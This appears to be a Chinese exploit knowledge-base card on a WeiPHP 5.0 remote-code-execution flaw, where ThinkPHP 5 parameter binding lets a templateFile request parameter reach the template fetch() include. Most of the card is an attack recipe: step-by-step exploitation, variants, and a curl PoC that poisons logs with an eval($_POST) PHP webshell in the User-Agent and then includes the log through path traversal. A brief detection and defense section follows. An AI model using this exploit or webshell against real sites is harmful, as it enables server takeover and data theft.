---
id: web-php-file-inclusion-weiphp5-templatefile-param-binding-fetch-log
title: WeiPHP 5.0 前台 RCE：common_add/common_lists 的 templateFile 经 ThinkPHP 参数绑定自动注入 fetch，包含日志执行
type: scenario
domain: web
path: web/php/file-inclusion
technique: weiphp5-tp5-param-binding-template-file-include-rce
affected_versions: WeiPHP 5.0
tags:
- php
- weiphp
- thinkphp
- file-inclusion
- parameter-binding
- template
- log-poisoning
- rce
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V569
  verified_at: '2026-11-12T09:34:22+08:00'
  notes: 已对照原文与截图05核对：Base.php common_add/common_lists 签名含 templateFile 且 fetch($templateFile)、TP5 param()→invokeReflectMethod→bindParams 参数绑定、日志投毒 UA、coupon/api/common_add?templateFile= 入口均一致。原文未给出日志路径与最终回显，卡内已注明确认部署；验证时已将示例日志路径由 2024-02.log 修正为 TP5 默认 runtime/log/YYYYMM/DD.log（原文未指定路径，避免误导）。未复现。
url: /docs/web/php/file-inclusion/web-php-file-inclusion-weiphp5-templatefile-param-binding-fetch-log/
draft: false
kb_aliases:
- WeiPHP 5.0 前台 RCE v2
- templateFile 参数绑定
- common_add templateFile
- ThinkPHP bindParams 模板包含
- 日志包含 RCE
- Base.php common_lists fetch
---

## 一句话结论

WeiPHP 5.0 的 `application/common/controller/Base.php` 中 `common_add`/`common_lists` 方法签名带 `$templateFile` 参数并在方法内 `return $this->fetch($templateFile)`；ThinkPHP 5 的自动参数绑定会把请求中同名参数（`?templateFile=...`）绑定进该参数，攻击者因此可让模板引擎包含任意文件——把 PHP 代码写进 UA/日志后再指向日志文件，即可打通前台 RCE。

## 原理

- **危险的参数设计**：`common_lists($model = null, $templateFile = '', $order = 'id desc')` 与 `common_add($model = null, $templateFile = '', $post_data = [])` 都把 `$templateFile` 当普通参数，空值时用默认模板名，`return $this->fetch($templateFile)` 直接渲染。
- **ThinkPHP 5 参数绑定**：`Module.php` 取 `$this->request->param()` 与路由参数合并为 `$vars`，进入 `invokeReflectMethod($instance, $reflect, $vars)` 后 `$args = $this->bindParams($reflect, $vars)`，按方法形参名把请求参数绑定为实参。因此无需控制器显式读取 `input('templateFile')`，只要请求带 `templateFile` 就会被自动注入。
- **Sink**：`fetch($templateFile)` 走模板 `File::read()` 的 `include $this->cacheFile`，路径无白名单/目录限制，可包含任意可读文件（含目录穿越）。
- **日志投毒**：应用访问日志/ThinkPHP 日志会记录 UA、URL 等请求内容（原文提示"内容可以包含进日志插入 UA 头"）；先发一个 UA 含 PHP 代码的请求写入日志，再让 `templateFile` 指向该日志文件，模板引擎编译/包含时执行其中的 PHP。
- **为什么成立**：参数绑定机制对企业 CMS 基类方法是全局生效的，开发者通常只把参数绑定当便利特性，忽略了形参名可被外部请求直接填充。

## 触发条件

- WeiPHP 5.0（ThinkPHP 5 内核）且 `common_add`/`common_lists` 所在控制器（如 `coupon/api`）路由可达；
- 框架开启了自动参数绑定（TP5 默认行为）；
- 日志文件路径可预测/可读，且日志内容包含攻击者可控字符串（UA、URL 等）；
- 服务器允许模板引擎包含日志文件（无 open_basedir 等限制）。

## 利用步骤

1. 找到继承 Base 的前台控制器与可访问方法，例如 `public/index.php/coupon/api/common_add`（GET 请求走 `fetch($templateFile)` 分支）。
2. 先向任意可记录日志的路由发送带 PHP 代码的 UA（或让 URL 携带 PHP 代码），把 `<?php eval($_POST[1]);?>` 或 `{php}...{/php}` 写进访问日志/TP 日志。
3. 请求 `public/index.php/coupon/api/common_add?templateFile=<日志文件路径>`，触发 `fetch()` 包含日志。
4. 日志中的 PHP 代码被执行，写入 webshell 或直接命令执行。

## PoC

```bash
# 1) 日志投毒：UA 写入 PHP 代码（也可放 URL/Referer，取决于日志格式）
curl -s -A '<?php eval($_POST[1]);?>' 'http://target/public/index.php/' >/dev/null

# 2) templateFile 指向日志文件，触发模板包含
curl -s 'http://target/public/index.php/coupon/api/common_add?templateFile=../runtime/log/202402/01.log'
```

日志路径需按目标实际部署确认（TP5 默认 `runtime/log/YYYYMM/DD.log`，如 `runtime/log/202402/01.log`；Apache `access.log` 等）；若日志含转义/编码，可改用包含上传的图片马等已知路径。

## 变体与关联

- 变体：`common_lists` 同样受控；`templateFile` 也可指向上传目录里的图片马（配合任意上传），或 `php://filter`/`data://`（若未被禁用）。
- 关联：ThinkPHP 5.0.x view() 模板路径包含 [[web-php-file-inclusion-thinkphp-view-template]]（同 sink，CVE-2025-63888；本卡是参数绑定自动注入形参而非控制器显式传参）；同产品 3.0 的 display(temp) 包含 [[web-php-file-inclusion-weiphp3-ueditor-scrawlup-template-include]]；日志投毒通用手法见文件包含/日志相关卡。
- 变体：TP5 的 `_method=__construct` 等参数覆盖技巧可与参数绑定组合，扩大可控形参范围。

## 检测与防御

- 检测：请求中出现 `templateFile=`、`templateFile` 指向 `runtime/log`、`access.log`、`.log`、`php://`、`../`；日志文件内容出现 PHP/模板标签。
- 防御：升级 WeiPHP；不要在可路由方法签名中暴露模板路径参数（改为内部变量/白名单枚举）；对模板名做白名单；日志目录不可被模板包含（open_basedir 限制）；过滤请求参数中的 `templateFile` 键。
